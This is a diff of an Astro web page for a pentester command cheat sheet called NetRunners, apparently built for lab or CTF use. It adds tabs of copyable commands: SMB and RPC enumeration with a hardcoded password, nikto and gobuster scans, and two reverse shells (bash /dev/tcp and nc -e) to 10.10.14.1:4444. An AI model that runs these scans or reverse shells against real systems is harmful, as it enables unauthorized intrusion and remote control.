@@ -1,9 +1,9 @@
 ---
-import NavMenu from "../components/NavMenu.astro";
-import ReverseShells from "../components/ReverseShells.astro";
-import ServicesPentest from "../components/ServicesPentest.astro";
-import Privesc from "../components/Privesc.astro";
 import "../styles/global.css";
+import Layout from "../layouts/Layout.astro";
+import CommandBox from "../components/CommandBox.astro";
+import InputBox from "../components/InputBox.astro";
+import TabButton from "../components/TabButton.astro";
 ---
 
 <html lang="en">
@@ -13,23 +13,144 @@ import "../styles/global.css";
 		<title>Penetration Testing Toolkit</title>
 	</head>
 	<body class="bg-gray-100 font-sans">
-		<div class="container mx-auto p-4">
-			<header class="text-center mb-8">
-				<h1 class="text-4xl font-bold text-gray-800">
-					Penetration Testing Toolkit
-				</h1>
-				<p class="text-lg text-gray-600 mt-2">
-					A Lightweight, Client-Side Suite for Pentesters
-				</p>
-			</header>
+		<Layout>
+			<main class="min-h-screen bg-black text-white font-mono p-4">
+				<div
+					class="max-w-screen-lg mx-auto border-2 border-white p-4 rounded-xl"
+				>
+					<div
+						class="flex justify-between items-center mb-4 border-b border-white pb-2"
+					>
+						<div class="text-xl font-bold tracking-wider">
+							NetRunners
+						</div>
+						<nav class="space-x-4">
+							<button class="text-white hover:underline"
+								>COMMANDS</button
+							>
+							<button class="text-white hover:underline"
+								>WRITEUPS</button
+							>
+							<button class="text-white hover:underline"
+								>SUPPORT</button
+							>
+							<button class="text-white hover:underline"
+								>About</button
+							>
+						</nav>
+					</div>
 
-			<NavMenu />
-			<main>
-				<ReverseShells />
-				<ServicesPentest />
-				<Privesc />
+					<div class="grid grid-cols-3 gap-4">
+						<!-- Left Form Inputs -->
+						<div class="space-y-4">
+							<InputBox label="IP" />
+							<InputBox label="PUERTO" />
+							<InputBox label="USUARIO" />
+							<InputBox label="CONTRASEÑA" />
+							<InputBox label="DOMINIO" />
+						</div>
+
+						<!-- Command Section -->
+						<div class="col-span-2 space-y-4">
+							<div
+								class="flex space-x-2 border-b border-white pb-2"
+							>
+								<button
+									class="tab-btn px-4 py-1 border border-white rounded-md bg-white text-black"
+									data-tab="ad">ACTIVE DIRECTORY</button
+								>
+								<button
+									class="tab-btn px-4 py-1 border border-white rounded-md text-white"
+									data-tab="web">WEB</button
+								>
+								<button
+									class="tab-btn px-4 py-1 border border-white rounded-md text-white"
+									data-tab="revshell">REVSHELL</button
+								>
+							</div>
+
+							<div id="tab-content" class="space-y-2">
+								<div data-tab-content="ad">
+									<CommandBox
+										command="smbclient -L //10.10.11.31 -U e.rodriguez"
+									/>
+									<CommandBox
+										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
+									/>
+								</div>
+								<div data-tab-content="web" class="hidden">
+									<CommandBox
+										command="nikto -h http://10.10.11.31"
+									/>
+									<CommandBox
+										command="gobuster dir -u http://10.10.11.31 -w /usr/share/wordlists/dirb/common.txt"
+									/>
+								</div>
+								<div data-tab-content="revshell" class="hidden">
+									<CommandBox
+										command="bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"
+									/>
+									<CommandBox
+										command="nc -e /bin/bash 10.10.14.1 4444"
+									/>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+
+				<script>
+					const tabButtons = document.querySelectorAll(".tab-btn");
+					const tabContents =
+						document.querySelectorAll("[data-tab-content]");
+
+					tabButtons.forEach((btn) => {
+						btn.addEventListener("click", () => {
+							tabButtons.forEach((b) => {
+								b.classList.remove("bg-white", "text-black");
+								b.classList.add("text-white");
+							});
+							btn.classList.add("bg-white", "text-black");
+							btn.classList.remove("text-white");
+
+							const target = btn.getAttribute("data-tab");
+							tabContents.forEach((content) => {
+								if (
+									content.getAttribute("data-tab-content") ===
+									target
+								) {
+									content.classList.remove("hidden");
+								} else {
+									content.classList.add("hidden");
+								}
+							});
+						});
+					});
+
+					document.querySelectorAll("button").forEach((button) => {
+						if (button.textContent?.trim() === "COPY") {
+							button.addEventListener("click", () => {
+								const span =
+									button.parentElement?.querySelector("span");
+								if (!span) return;
+
+								const command = span.textContent;
+								if (!command) return;
+
+								navigator.clipboard
+									.writeText(command)
+									.then(() => {
+										button.textContent = "COPIED";
+										setTimeout(() => {
+											if (button)
+												button.textContent = "COPY";
+										}, 1000);
+									});
+							});
+						}
+					});
+				</script>
 			</main>
-		</div>
-		<script type="module" src="/script.js"></script>
+		</Layout>
 	</body>
 </html>
